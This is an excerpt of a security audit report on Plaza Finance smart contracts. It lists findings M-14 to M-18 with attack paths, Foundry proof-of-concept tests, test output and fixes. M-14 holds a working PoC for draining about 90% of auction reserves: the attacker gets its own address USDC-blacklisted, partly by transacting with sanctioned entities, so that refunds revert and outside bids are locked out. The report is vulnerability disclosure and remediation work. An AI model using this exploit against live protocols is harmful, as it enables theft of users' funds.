# M-17 - The state variable BondToken.globalPool is updated incorrectly via Pool.startAuction()

**Severity:** medium
**Auditor:** Sherlock
**Protocol:** Plaza Finance
**Keywords:** BondToken, globalPool, startAuction, incorrect update, coupon tokens, claim, financial discrepancy, smart contract, Ethereum, vulnerability, security, protocol, attack vector, user funds, liquidity, risk, sharesPerToken, auction, pool, contract logic

---

# Issue M-14: Attacker can drain most of the reserves by weaponizing USDC blacklisting

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/866)

Found by  
056Security, 0rpse, 0x23r0, 0x52, 0xAkira, 0xDLG, 0xDemon, 0xEkko, 0xGondar, 0xadrii,  
0xmystery, Aymen0909, Boy2000, ChainProof, DenTonylifer, Goran, KiroBrejka,  
KlosMitSoss, PeterSR, Ryonen, Strapontin, Waydou, X0sauce, ZeroTrust, ZoA, almurhasan,  
alphacipher, ccvascocc, copperscrewer, denys_sosnovskyi, eLSeR17, farismaulana,  
fuzzysquirrel, jprod15, n1ikh1l, novaman33, pashap9990, phoenixv110, silver_eth, simeonk,  
t.aksoy, t0x1c, tinnohofficial, zraxx, zxriptor


Auction mechanism uses push transfer to refund the lowest bidder when their bid has fallen out of the queue. Since refund token will be USDC, this opens a possibility to weaponize USDC blacklisting feature and attack the protocol to drain the reserves out of it.


Auction mechanism can be taken advantage of. The key root cause which enables the vulnerability is in the \u0060_removeBid\u0060.

Auction works by collecting bids. There can be at most 1000 active bids. When the next bids come it will replace the currently lowest bid. Lowest bid is then removed and that bidder is refunded:

\u0060\u0060\u0060solidity
function _removeBid(uint256 bidIndex) internal {
    ...
    // Refund the buy tokens for the removed bid
    IERC20(buyCouponToken).safeTransfer(bidder, sellCouponAmount);
    emit BidRemoved(bidIndex, bidder, buyReserveAmount, sellCouponAmount);
    delete bids[bidIndex];
    bidCount--;
}
\u0060\u0060\u0060

The issue is that coupon token is USDC and refund triggered by \u0060safeTransfer\u0060 will fail if the receiver (the original bidder) is blacklisted. In that case no more bids can enter the system since removing the currently lowest bid will always revert.
This scenario can happen by accident where bidder gets blacklisted. However, it can also be weaponized by attacker to perform an attack on the protocol and drain the majority of the funds from the pool. Attack can look like this:

- Immediately after new auction is started attacker submits 999 super low bids from address A to acquire ~90% of WETH reserves (auction can\u0027t sell more than that).
- From another address B attackers submit the last 1000th bid which is even lower than previous ones, and thus the lowest in the system.
- Attacker intentionally gets his address B USDC-blacklisted by Circle by interacting with OFAC-sanctioned entities.
- Now attacker has guaranteed that no new bids can enter the system (removing the bid would revert) and attacker\u0027s super low 999 bids will be accepted by protocol.

One thing which is not fully in attacker\u0027s control is getting the address B blacklisted in a timely manner, before other bidders outbid the attacker\u0027s lowest bid. But attacker can increase the likelihood of getting blacklisted by immediately starting to interact with sanctioned addresses and doing other sanctionable actions. This would automatically flag the address and the malicious behaviour to Circle. On the other hand, auction period lasts for 10 days, so other bidders are not in rush to submit their bids. Those factors increase the likelihood of successful attack.


No specific internal pre-conditions.


1. Attacker has to be the first bidder to submit bid (more precisely he will submit 1000 bids atomically).
2. Attacker has to manage to USDC-blacklist his address used to submit 1000th bid.


New auction has started. Attacker immediately executes the attack by atomically performing:

1. From address A submit 999 bids. USDC amount is minimal in every bid - a single slot Size. WETH amount requested in each bid is ~1/1000*(90% of WETH reserves).
2. From address B attacker submits a single bid which fills up the 1000th place in the queue. This will be the lowest bid. USDC amount is a single slot Size, and WETH amount requested is 1 wei less than previous 999 bids. This ensures that this bid is the lowest one.
3. From address B attacker starts interacting (like sending some USDC) with OFAC sanctioned addresses. This should automatically trigger Circle\u0027s USDC blacklisting process.

4. Now when legitimate bidders send their bid, the lowest bid has to be removed (as queue is full at 1000). However removing the bid means sending the refund USDC back to the blacklisted address B - this will revert.

5. No one can add the new bid. Auction time passes and end Auction is triggered.

6. Auction is successfully finished. Attacker can now claim his 999 bids. In this way, attacker acquires ~90% of WETH reserves for only 999 slot Size amounts of USDC spent. In the POC, it is demonstrated how attacker acquires ~850 WETH for ~7500 USDC.

Pool can lose up to 90% percent of the reserves (or whatever pool sale limit is set to).

This PoC shows how attacker can drain most of the reserve funds from the Auction by spending a relatively much smaller USDC amount.

\u0060\u0060\u0060solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import "../src/Pool.sol";
import {Token} from "./mocks/Token.sol";
import {Utils} from "../src/lib/Utils.sol";
import {BondToken} from "../src/BondToken.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {Distributor} from "../src/Distributor.sol";
import {OracleFeeds} from "../src/OracleFeeds.sol";
import {LeverageToken} from "../src/LeverageToken.sol";
import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";
import {Deployer} from "../src/utils/Deployer.sol";
import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "forge-std/console.sol";

contract PoolTest_FeeCollection is Test {
    address deployer = makeAddr("deployer");
    address feeBeneficiary = makeAddr("feeBeneficiary");
    address governance = makeAddr("governance");
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
MockPriceFeed mockPriceFeed;
// 5% fee
uint256 fee = 50000;
function test_AuctionExploit() public {
    // create factory
    PoolFactory factory = _createFactory();
    console.log("Factory created");
    // create tokens
    address reserveToken = address(new Token("Wrapped ETH", " WETH", false));
    address couponToken = address(new Token("USDC", "USDC", false));
    Token(couponToken).setDecimals(6);
    // create pool
    Pool pool = _createPool(factory, reserveToken, couponToken);
    console.log("Pool created");
    // there is 1000 WETH deposited in the pool (for simplicity in 1 call)
    address alice = makeAddr("alice");
    uint256 deposit = 1000 ether;
    deal(reserveToken, alice, deposit);
    console.log("Users deposits 1000 WETH");
    vm.startPrank(alice);
    IERC20(reserveToken).approve(address(pool), deposit);
    pool.create({tokenType: Pool.TokenType.BOND, depositAmount: deposit,
    minAmount: 0});
    vm.stopPrank();
    // one distribution period has passed
    vm.warp(block.timestamp + pool.getPoolInfo().distributionPeriod + 1);
    // set 10 days auction period
    uint256 auctionPeriod = 10 days;
    vm.prank(governance);
    pool.setAuctionPeriod(auctionPeriod);
    // start auction
    pool.startAuction();
    Auction auction = Auction(pool.auctions(0));
    uint256 totalCouponAmount = auction.totalBuyCouponAmount();
    uint256 slotSize = totalCouponAmount / 1000;
    console.log("Amount of USDC to be collected in auction:",
    totalCouponAmount);
    console.log("Slot size:", slotSize);
    //// START EXPLOIT
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
// 1st step - attacker submits 999 bids to buy most of the availabe WETH
// (estimated 90% of reserves at the auction end time)
// USDC amount is the minimal - 1x slotSize
// WETH amount is ~ 1/1000 of 90% of reserves per bid (because at most 90%
// of reserves can be sold in auction)
address attackerAddressA = makeAddr("attacker address A");
uint256 wethAmount = 0.85 ether;
uint256 usdcAmount = slotSize;
deal(couponToken, attackerAddressA, slotSize * usdcAmount);
vm.startPrank(attackerAddressA);
uint256 numberOfBids = 999;
IERC20(couponToken).approve(address(auction), numberOfBids * usdcAmount);
for (uint256 i = 0; i < numberOfBids; i++) {
    auction.bid({buyReserveAmount: wethAmount, sellCouponAmount: usdcAmount});
}
vm.stopPrank();
console.log("addressA submitted 999 bids");

// 2nd step - submit 1000th bid (the one that fills up the bid queue) from
// another address
// USDC amount spent is minimal - 1x slotSize per bid
// WETH amount is a little bit lower than in previous 999 bids - this bid
// has to be the lowest one
address attackerAddressB = makeAddr("attacker address B");
wethAmount += 1;
usdcAmount = slotSize;
deal(couponToken, attackerAddressB, usdcAmount);
vm.startPrank(attackerAddressB);
IERC20(couponToken).approve(address(auction), usdcAmount);
auction.bid({buyReserveAmount: wethAmount, sellCouponAmount: usdcAmount});
vm.stopPrank();
console.log("addressB submitted 1000th bid");

// 3rd step - now attacker\u0027s goal is to get his addressB blacklisted by
// Circle as soon as possible.
// Quick way to do it is to start sending TXs to the US OFAC sanctioned
// entities. This should automatically trigger blacklisting process
// Here we mock blacklisting of the addressB
vm.mockCallRevert(
    couponToken, abi.encodeWithSelector(IERC20.transfer.selector,
    attackerAddressB, slotSize), "Blacklisted!"
);
console.log("addressB (lowest bidder) got blacklisted");

// 4th step - legitimate bidder tries to submit bid. Since queue is already
// filled with 1000 bids, the lowest one has to be removed.
// However removing the lowest bid means sending refund USDC to the
// blacklisted address -> TX will revert
address legitimateBidder = makeAddr("legitimateBidder");
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
wethAmount = 1 ether;
usdcAmount = slotSize * 40;
deal(couponToken, legitimateBidder, usdcAmount);
vm.startPrank(legitimateBidder);
IERC20(couponToken).approve(address(auction), usdcAmount);
console.log("Try submitting legitimate bid");
auction.bid({buyReserveAmount: wethAmount, sellCouponAmount: usdcAmount});
vm.stopPrank();
}
function _createFactory() internal returns (PoolFactory) {
    vm.startPrank(deployer);
    // create factory
    address oracleFeedsContract = address(new OracleFeeds());
    PoolFactory factory = PoolFactory(
        Utils.deploy(
            address(new PoolFactory()),
            abi.encodeCall(
                PoolFactory.initialize,
                (
                    governance,
                    address(new Deployer()),
                    oracleFeedsContract,
                    address(new UpgradeableBeacon(address(new Pool(),
                    deployer)),
                    address(new UpgradeableBeacon(address(new BondToken(),
                    deployer)),
                    address(new UpgradeableBeacon(address(new LeverageToken(),
                    deployer)),
                    address(new UpgradeableBeacon(address(new Distributor(),
                    deployer))
                )
            )
        )
    );
    vm.stopPrank();
    vm.startPrank(governance);
    factory.grantRole(factory.POOL_ROLE(), deployer);
    vm.stopPrank();
    return factory;
}
function _createPool(PoolFactory factory, address reserveToken, address
couponToken) internal returns (Pool) {
    vm.startPrank(deployer);
    uint256 reserveAmount = 1e18;
    deal(reserveToken, deployer, reserveAmount);
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
IERC20(reserveToken).approve(address(factory), reserveAmount);
// create pool
Pool pool = Pool(
  factory.createPool({
    params: PoolFactory.PoolParams({
      fee: fee,
      feeBeneficiary: feeBeneficiary,
      reserveToken: reserveToken,
      sharesPerToken: 2_500_000,
      distributionPeriod: 90 days,
      couponToken: couponToken
    }),
    reserveAmount: reserveAmount,
    bondAmount: 10 ether,
    leverageAmount: 20 ether,
    bondName: "Bond WETH",
    bondSymbol: "bond WETH",
    leverageName: "Levered WETH",
    leverageSymbol: "lev WETH",
    pauseOnCreation: false
  })
);
// Deploy the mock price feed
mockPriceFeed = new MockPriceFeed();
mockPriceFeed.setMockPrice(3000 * int256(10 ** 8), uint8(8));
OracleFeeds(factory.oracleFeeds()).setPriceFeed(
  address(pool.reserveToken()), address(0), address(mockPriceFeed), 1 days
);
vm.stopPrank();
return pool;
\u0060\u0060\u0060

Running this test shows how legitimate bidder cannot submit bid, because removing the lowest bid will revert due to the blacklisted submitter.

\u0060\u0060\u0060
forge test --mt test_AuctionExploit -vv
Ran 1 test for test/G_POC_WBTC.t.sol:PoolTest_FeeCollection
[FAIL: Blacklisted!] test_AuctionExploit() (gas: 1077754809)
Logs:
 Factory created
 Pool created
 Users deposits 1000 WETH
 Amount of USDC to be collected in auction: 75025000000
 Slot size: 75025000
 addressA submitted 999 bids
\u0060\u0060\u0060
addressB submitted 1000th bid  
addressB (lowest bidder) got blacklisted  
Try submitting legitimate bid  

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.55s (2.55s CPU time)  

Now let\u0027s expand the test to demonstrate how auction ends and attacker drains the reserves:

\u0060\u0060\u0060solidity
// 4th step - legitimate bidder tries to submit bid. Since queue is already filled with 1000 bids, the lowest one has to be removed.
// However removing the lowest bid means sending refund USDC to the blacklisted address -> TX will revert
address legitimateBidder = makeAddr("legitimateBidder");
wethAmount = 1 ether;
usdcAmount = slotSize * 40;
deal(couponToken, legitimateBidder, usdcAmount);
vm.startPrank(legitimateBidder);
IERC20(couponToken).approve(address(auction), usdcAmount);
console.log("Try submitting legitimate bid");
vm.expectRevert("Blacklisted!");
auction.bid({buyReserveAmount: wethAmount, sellCouponAmount: usdcAmount});
vm.stopPrank();
// 5th step - after auction ends attacker claims his 999 bids. Ends up acquiring 849.15 WETH for ~7500 USDC.
vm.warp(block.timestamp + 10 days);
auction.endAuction();
assertEq(uint256(auction.state()), uint256(Auction.State.SUCCEEDED));
console.log("Auction ended successfully");

vm.startPrank(attackerAddressA);
for (uint256 i = 0; i < numberOfBids; i++) {
    auction.claimBid(i + 1);
}
assertEq(IERC20(reserveToken).balanceOf(attackerAddressA), 999 * 0.85 ether);

console.log("Attacker\u0027s amount of USDC spent:", 100 * slotSize);
console.log("Attacker\u0027s amount of WETH acquired:", IERC20(reserveToken).balanceOf(attackerAddressA));
\u0060\u0060\u0060

Runit:  
\u0060\u0060\u0060
forge test --mt test_AuctionExploit -vv
\u0060\u0060\u0060
[PASS] test_AuctionExploit() (gas: 1114214211)  
Logs:  
Factory created
Pool created  
Users deposits 1000 WETH  
Amount of USDC to be collected in auction: 75025000000  
Slot size: 75025000  
addressA submitted 999 bids  
addressB submitted 1000th bid  
addressB (lowest bidder) got blacklisted  
Try submitting legitimate bid  
Auction ended successfully  
Attacker\u0027s amount of USDC spent: 7502500000  
Attacker\u0027s amount of WETH acquired: 849150000000000000000  
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.60s (2.59s CPU time)  
As seen in the output attacker acquired 849.15 WETH by spending only ~7500 USD on the attack!  

Use pull instead of push approach for USDC refunds (in the case of automatically removing the lowest bid)  

sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
[https://github.com/Convexity-Research/plaza-evm/pull/138](https://github.com/Convexity-Research/plaza-evm/pull/138)
## Issue M-15: Auctions succeeding condition does not take into account the claimable fees in the pool.

It can result of a drastic reduction of claimable fees if auction succeeds, or cause an auction to fail if the fees are claimed.

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/891)

Found by: 0xadrii, BADROBINX, Boy2000, Strapontin, bladeee, copperscrewer, i3arba, komane007, phoenixv110, shiazinho, t0x1c, y4y


One of the condition for an auction to succeed is to have the total bet of reserveToken be less than or equal to 90% (or higher, set by admin) of the pool\u0027s balance to ensure tokens are transferred. This calculation does not take into account the amount of fees claimable by the beneficiary, and can result in two issues:

- When an auction succeeds, it gets from the pool the amount of tokens users bet. This will drastically reduce the fees claimable from the beneficiary as it lowers the pool\u0027s balance, which is linked to fees calculation.
- If an auction should succeed by having the total of reserveToken bid being on the lower edge of the 90% of pool\u0027s token amount, and the fees are claimed, then the auction may fail if the reserveToken bid become higher than the newly calculated 90% to tokens in the pool.


Auction does not include the claimable fees when calculating the reserve amount it can receive.


No response.
No response
## Attack path 1
1. An auction is created and the condition for it to succeed are met (with an average total amount of reserveToken bid)
2. The amount of fees claimable are equal to X
3. The function \u0060Auction::endAuction\u0060 is called and the auction succeeds, taking reserveToken from the pool
4. The amount of fees claimable are now lower than X

### Attack path 2
1. An auction is created and the condition for it to succeed are met (with a high total amount of reserveToken bid, near 90%)
2. The fees are claimed
3. The function \u0060Auction::endAuction\u0060 is called and the auction ends in the state \u0060FAILED_POOL_SALE_LIMIT\u0060 because the bids are higher than allowed amount of reserveToken

Drastic reduction of fees claimable and potential auction ending in an unsuccessful state

To get the amount of fees claimable from the pool, set the visibility of the function \u0060Pool::getFeeAmount\u0060 to public.

Copy this PoC in \u0060Auction.t.sol\u0060 and run it:
\u0060\u0060\u0060solidity
// forge test --mt test_auction_fees_1 -vvv
function test_auction_fees_1() public {
    // We need to set the poolSaleLimit to 90% because it is set to 110% in the setUp
    uint256 poolSaleLimitSlot = 6;
    vm.store(address(auction), bytes32(poolSaleLimitSlot), bytes32(uint256(90)));
    console.log(auction.poolSaleLimit());
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
// Set the fees at 10%
vm.prank(governance);
Pool(pool).setFee(100000);
uint256 maxUSDCToBid = auction.totalBuyCouponAmount();
// If we go beyond this value, endAuction will end in a failed state
uint256 maxReserveTokenClaimable =
    (IERC20(auction.sellReserveToken()).balanceOf(pool) *
    auction.poolSaleLimit()) / 100;
// 1. The auction can succeed, and will rewards users for half of the pool\u0027s
// claimable amount
vm.startPrank(bidder);
usdc.mint(bidder, maxUSDCToBid);
usdc.approve(address(auction), maxUSDCToBid);
auction.bid(maxReserveTokenClaimable / 2, maxUSDCToBid);
vm.stopPrank();
vm.warp(auction.endTime());
// 2. Amount of fees claimable are equal to X
// Set \u0060getFeeAmount\u0060 to public to see its result value
uint256 claimableFeesBefore = Pool(pool).getFeeAmount();
console.log("claimableFeesBefore", claimableFeesBefore);
// 3. \u0060endAuction\u0060 put the auction in the succeed state
auction.endAuction();
assert(Auction.State.SUCCEEDED == auction.state());
// 4. The amount of fees claimable are now lower than X
uint256 claimableFeesAfter = Pool(pool).getFeeAmount();
console.log("claimableFeesAfter ", claimableFeesAfter);
assert(claimableFeesBefore > claimableFeesAfter);
}
// forge test --mt test_auction_fees_2 -vvv
function test_auction_fees_2() public {
// We need to set the poolSaleLimit to 90% because it is set to 110% in the
uint256 poolSaleLimitSlot = 6;
vm.store(address(auction), bytes32(poolSaleLimitSlot), bytes32(uint256(90)));
console.log(auction.poolSaleLimit());
// Set the fees at 10%
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
vm.startPrank(governance);
Pool(pool).setFee(100000);
Pool(pool).setFeeBeneficiary(governance);
vm.stopPrank();
uint256 maxUSDCToBid = auction.totalBuyCouponAmount();
// If we go beyond this value, endAuction will end in a failed state
(FAILED_POOL_SALE_LIMIT)
uint256 maxReserveTokenClaimable =
(IERC20(auction.sellReserveToken()).balanceOf(pool) * auction.poolSaleLimit())
/ 100;
// 1. The auction can succeed, and will rewards users for almost the pool\u0027s
// claimable amount
vm.startPrank(bidder);
usdc.mint(bidder, maxUSDCToBid);
usdc.approve(address(auction), maxUSDCToBid);
auction.bid(maxReserveTokenClaimable - 10, maxUSDCToBid);
vm.stopPrank();
vm.warp(auction.endTime());
// 2. The fees are claimed
vm.prank(governance);
Pool(pool).claimFees();
// 3. Ending the auction fails it
auction.endAuction();
assert(Auction.State.FAILED_POOL_SALE_LIMIT == auction.state());
// Note that without the governance claiming fees, the auction would succeed
\u0060\u0060\u0060

Running them produces the following output:
\u0060\u0060\u0060
$ forge test --mt test_auction_fees_1 -vvv
[￿] Compiling...
[￿] Compiling 14 files with Solc 0.8.27
Solc 0.8.27 finished in 24.60s
Compiler run successful!
Ran 1 test for test/Auction.t.sol:AuctionTest
[PASS] test_auction_fees_1() (gas: 448008)
Logs:
  90
  claimableFeesBefore 1369863013698630136986301369
  100
\u0060\u0060\u0060
\u0060\u0060\u0060
claimableFeesAfter     753424657534246575342465753
\u0060\u0060\u0060

\u0060\u0060\u0060
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.26ms (2.42ms CPU time)
Ran 1 test suite in 42.30ms (19.26ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
...
$ forge test --mt test_auction_fees_2 -vvv
[￿] Compiling...
No files changed, compilation skipped
Ran 1 test for test/Auction.t.sol:AuctionTest
[PASS] test_auction_fees_2() (gas: 467880)
Logs:
   90
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.09ms (2.16ms CPU time)
Ran 1 test suite in 39.14ms (19.09ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
\u0060\u0060\u0060

Includetheclaimablefeeswhencalculatingthetotalselltokenlimitattheendofan auction,orallocateanamountoftokensforanauctionwhentheauctioniscreated.

sherlock-admin2  
TheprotocolteamfixedthisissueinthefollowingPRs/commits:  
https://github.com/Convexity-Research/plaza-evm/pull/164
## IssueM-16: BondOracleAdapter can fetch price from inefficient Pool on Aerodrome

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/931)  
Found by: 0x52, 0xadrii, ZeroTrust, bretzel, zxriptor  

The BondOracleAdapter\u0027s getPool function can select an inefficient pool, leading to inappropriate price feeds. An attacker can create a pool with an extremely low fee and inefficient tick spacing, which the adapter might prioritize, leading to a skewed price oracle.  

The getPool function in BondOracleAdapter.sol iterates through an array of tick spacings (spacing) without considering the expected trading activity or fee structure for a Bond/USD pair that is a volatile pool. It prioritizes pools with tighter tick spacing, even if they are inefficient. The documentation states:  

- Concentrated Liquidity Tick Spacing: In Velodrome\u0027s concentrated liquidity pools, the concept of tick spacing is used. This refers to the minimum price movement between liquidity ranges.
- Stable token pools use a price range boundary of 0.5% (tick space 50) for tokens like USDC, DAI, LUSD.
- Volatile token pools use a price range boundary of 2% (tick space 200) for tokens like OP and WETH.
- For highly correlated tokens like stable coins and liquid staked tokens, a price range boundary of 0.01% (tick space 1) is available.
- For emerging tokens like AERO and VELO, a price range boundary of 20% (tick space 2000) is available to reduce liquidity pool re-balance needs.

The lack of a fee check allows an attacker to create a pool with a very low fee that the adapter might select, further distorting the price feed.  

N/A
1. An attacker must deploy a Concentrated Liquidity pool on the same dex Factory with the same bond Token and liquidity Token, but with an inefficient tick spacing (e.g., 1).

1. The attacker deploys a pool with a very tight tick spacing (e.g., 1). This pool is likely inefficient for a Bond/USD pair.
2. When the adapter is initialized or fetches the price, the getPool function is called.
3. The getPool function iterates through the spacing array and finds the attacker\u0027s pool. Because it prioritizes tighter tick spacing and lacks a fee check, it selects the attacker\u0027s inefficient pool.
4. The adapter now uses the inefficient pool for price information. This pool is susceptible to manipulation due to low liquidity (people don\u0027t want to pin this pool).

If this feeds is still retained inside Pool.sol, the protocol and its users rely on a distorted market price for bond token. The attacker can manipulate the price in their inefficient pool.

N/A

Modify the getPool function to prioritize pools based on expected trading behavior and fee structure for the Bond/USD pair. Consider factors like typical trading volume and volatility when selecting a suitable tick spacing. For example, start with more reasonable tick spacing.

sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
[https://github.com/Convexity-Research/plaza-evm/pull/168](https://github.com/Convexity-Research/plaza-evm/pull/168)
## IssueM-17: The state variable BondToken.globalPool is updated incorrectly via Pool.startAuction()

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/972)  
Found by: 0xmystery, MysteryAuditor, Pablo, X0sauce, bretzel, mxteem, silver_eth, wellbyt3

When an auction starts, the globalPool state variable of BondToken is updated incorrectly. This leads to the wrong calculation of coupon tokens that bondholders can claim.

In the startAuction() function of Pool.sol, the state variable in bondToken is updated by calling bondToken.increaseIndexedAssetPeriod(sharesPerToken).

\u0060\u0060\u0060solidity
function startAuction() external whenNotPaused() {
    ...
    // Calculate the coupon amount to distribute
    uint256 couponAmountToDistribute = (normalizedTotalSupply * normalizedShares)
      .toBaseUnit(maxDecimals * 2 - IERC20(couponToken).safeDecimals());
    auctions[currentPeriod] = Utils.deploy(
     address(new Auction()),
     abi.encodeWithSelector(
      Auction.initialize.selector,
      address(couponToken),
      address(reserveToken),
      couponAmountToDistribute,
      block.timestamp + auctionPeriod,
      1000,
      address(this),
      poolSaleLimit
     )
    );
    // Increase the bond token period
    bondToken.increaseIndexedAssetPeriod(sharesPerToken);
    // Update last distribution time
}
\u0060\u0060\u0060
lastDistribution = block.timestamp;

In the \u0060increaseIndexedAssetPeriod()\u0060 function of \u0060BondToken.sol\u0060, it updates the \u0060globalPool\u0060 state variable by pushing a new \u0060PoolAmount\u0060 struct to \u0060globalPool.previousPoolAmounts\u0060, setting \u0060sharesPerToken\u0060 as \u0060globalPool.sharesPerToken\u0060. Then it updates \u0060globalPool.sharesPerToken\u0060 with the new \u0060sharesPerToken\u0060. This logic is correct only if \u0060sharesPerToken\u0060 has not changed. However, the \u0060setSharesPerToken()\u0060 function in \u0060Pool.sol\u0060 allows for changes to \u0060sharesPerToken\u0060, and \u0060globalPool.sharesPerToken\u0060 can only be updated when starting an auction. If an auction starts with a new \u0060sharesPerToken\u0060, the function uses the previous value (\u0060globalPool.sharesPerToken\u0060), which is outdated. This leads to incorrect calculations of coupon tokens that bondholders can claim.

\u0060\u0060\u0060solidity
function increaseIndexedAssetPeriod(uint256 sharesPerToken) public
  onlyRole(DISTRIBUTOR_ROLE) whenNotPaused() {
    globalPool.previousPoolAmounts.push(
      PoolAmount({
        period: globalPool.currentPeriod,
        amount: totalSupply(),
        sharesPerToken: globalPool.sharesPerToken
      })
    );
    globalPool.currentPeriod++;
    globalPool.sharesPerToken = sharesPerToken;
    emit IncreasedAssetPeriod(globalPool.currentPeriod, sharesPerToken);
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function setSharesPerToken(uint256 _sharesPerToken) external NotInAuction
  onlyRole(poolFactory.GOV_ROLE()) {
    sharesPerToken = _sharesPerToken;
    emit SharesPerTokenChanged(sharesPerToken);
}
\u0060\u0060\u0060

As a result, the calculation of coupon tokens that bondholders can claim will be based on incorrect values.

\u0060\u0060\u0060solidity
function getIndexedUserAmount(address user, uint256 balance, uint256 period) public
  view returns(uint256) {
    IndexedUserAssets memory userPool = userAssets[user];
    uint256 shares = userPool.indexedAmountShares;
    for (uint256 i = userPool.lastUpdatedPeriod; i < period; i++) {
      shares += (balance *
        globalPool.previousPoolAmounts[i].sharesPerToken).toBaseUnit(SHARES_DECIMALS);
\u0060\u0060\u0060
\u0060\u0060\u0060plaintext
return shares;
\u0060\u0060\u0060
## Internal Pre-Conditions
The state variable sharesPerToken of the pool has been modified.

## External Pre-Conditions


The calculation of coupon tokens that bondholders can claim will be incorrect, potentially leading to financial discrepancies.

Update the increaseIndexedAssetPeriod() function to use the current value of sharesPerToken instead of globalPool.sharesPerToken.

\u0060\u0060\u0060solidity
function increaseIndexedAssetPeriod(uint256 sharesPerToken) public
    onlyRole(DISTRIBUTOR_ROLE) whenNotPaused() {
    globalPool.previousPoolAmounts.push(
        PoolAmount({
            period: globalPool.currentPeriod,
            amount: totalSupply(),
            sharesPerToken: sharesPerToken
        })
    );
    globalPool.currentPeriod++;
    globalPool.sharesPerToken = sharesPerToken;
    emit IncreasedAssetPeriod(globalPool.currentPeriod, sharesPerToken);
}
\u0060\u0060\u0060

sherlock-admin2  
The protocol team fixed this issue in the following PRs/commits:  
[https://github.com/Convexity-Research/plaza-evm/pull/161](https://github.com/Convexity-Research/plaza-evm/pull/161)
## Issue M-18: Missing Chainlink Price Feeds for wstETH/USD and stETH/USD in BalancerOracleAdapter.sol

Source: [GitHub Issue](https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/981)  
This issue has been acknowledged by the team but won\u0027t be fixed at this time.

Found by:  
056Security, 0rpse, 0xAadi, 0xShahilHussain, 0xadrii, Adotsam, Aymen0909, KiroBrejka, noromeb, pashap9990, sl1, solidityenj0yer, whitehat777, x0lohaclohell

The BalancerOracleAdapter.sol contract relies on Chainlink price feeds to calculate the prices of tokens used in a Balancer pool to determine the reserveToken. However, the Chainlink price feed aggregators for wstETH/USD and stETH/USD do not exist. When these tokens are included in the Balancer pool, calls to latestRoundData() will revert, as the price feeds are unavailable.

[Link to Code](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/BalancerOracleAdapter.sol#L109)  
In the latestRoundData() function, the contract attempts to fetch prices for each token in the pool via Chainlink price feeds. For tokens like wstETH and stETH, the contract expects a price feed in the form of wstETH/USD or stETH/USD. However, Chainlink does not provide such price feeds. As a result, any attempt to calculate prices for these tokens will fail, causing the contract to revert.

\u0060\u0060\u0060solidity
function latestRoundData() external view returns (uint80, int256, uint256,
    uint256, uint80) {
    .
    .
    .
    for(uint8 i = 0; i < tokens.length; i++) {
        oracleDecimals = getOracleDecimals(address(tokens[i]), USD);
        prices[i] = getOraclePrice(address(tokens[i]), USD).normalizeAmount(oracleDecimals, decimals);
    }
    .
    .
}
\u0060\u0060\u0060
The Balancer pool contains wstETH or stETH as part of the tokens.

The protocol or user queries the latestRoundData() function to fetch the price of tokens in the pool.

No response

If wstETH or stETH tokens are part of the Balancer pool, the latestRoundData() function will always revert.

No response

No response
